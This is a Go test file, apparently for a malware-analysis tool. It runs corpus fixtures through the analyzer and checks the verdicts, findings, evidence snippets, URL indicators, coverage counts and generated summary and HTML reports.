	for _, tt := range corpusCases() {
		t.Run(tt.name, func(t *testing.T) {
			// Given a fixture, committed or built at test time
			target := tt.target(t)
			// When the agent analyzes it
			rep, out := analyzeOut(t, target, tt.wantCode)
			checkCorpus(t, tt, rep, out)
		})
	}
}

// checkCorpus checks a report and the files next to it against a corpus case: the verdict, the findings at
// their lines, the coverage and the rendered reports. out is the directory with summary.md and report.html.
func checkCorpus(t *testing.T, tt corpusCase, rep report, out string) {
	t.Helper()
	verdicts := map[int]string{0: "clean", 10: "suspicious", 20: "malicious"}
	// Then the verdict, the findings at their lines and the coverage match
	if rep.Verdict != verdicts[tt.wantCode] {
		t.Errorf("verdict = %q, want %q", rep.Verdict, verdicts[tt.wantCode])
	}
	for _, want := range tt.wantRules {
		rule, at, _ := strings.Cut(want, " ")
		if !hasFinding(rep, rule, at) {
			t.Errorf("no %s at %s in %+v", rule, at, rep.Findings)
		}
	}
	for _, want := range tt.wantSnippets {
		found := false
		for _, f := range rep.Findings {
			for _, e := range f.Evidence {
				found = found || strings.Contains(e.Snippet, want)
			}
		}
		if !found {
			t.Errorf("no evidence snippet contains %q in %+v", want, rep.Findings)
		}
	}
	var iocs []string
	for _, i := range rep.IOCs {
		if i.Type == "url" {
			iocs = append(iocs, i.Value)
		}
	}
	for _, want := range tt.wantIOCs {
		if !slices.Contains(iocs, want) {
			t.Errorf("url iocs %q lack %q", iocs, want)
		}
	}
	if tt.wantQuiet {
		quiet := otherFindings(rep)
		for _, f := range rep.Findings {
			if f.Severity != "info" && slices.Contains(quiet, f.RuleID) {
				t.Errorf("benign fixture has a %s finding %s", f.Severity, f.RuleID)
			}
		}
	}
	if len(rep.Coverage.Skipped) != tt.wantSkips {
		t.Errorf("skips = %+v, want %d", rep.Coverage.Skipped, tt.wantSkips)
	}
	if tt.wantSkips == 0 && rep.Coverage.FilesAnalyzed != rep.Coverage.FilesSeen {
		t.Errorf("files_analyzed/files_seen = %d/%d, want all analyzed", rep.Coverage.FilesAnalyzed, rep.Coverage.FilesSeen)
	}
	summary := readFile(t, filepath.Join(out, "summary.md"))
	for _, want := range tt.wantSummary {
		if !strings.Contains(summary, want) {
			t.Errorf("summary.md lacks %q:\n%s", want, summary)
		}
	}
	// And the target line matches its kind: a file shows its SHA-256, a folder its file count
	switch rep.Target.Kind {
	case "file":
		if rep.Target.SHA256 == "" || !strings.Contains(summary, "- SHA-256: "+rep.Target.SHA256) {
			t.Errorf("file target sha256 %q is not in summary.md:\n%s", rep.Target.SHA256, summary)
		}
	default:
		if !strings.Contains(summary, "- Kind: folder, ") || strings.Contains(summary, "SHA-256") {
			t.Errorf("summary.md of a folder target is wrong:\n%s", summary)
		}
	}
	for _, name := range []string{"summary.md", "report.html"} {
		if m := liveLink.FindString(readFile(t, filepath.Join(out, name))); m != "" {
			t.Errorf("%s has a live link %q", name, m)
		}
	}
	checkHTMLPage(t, readFile(t, filepath.Join(out, "report.html")), rep.Verdict)
}
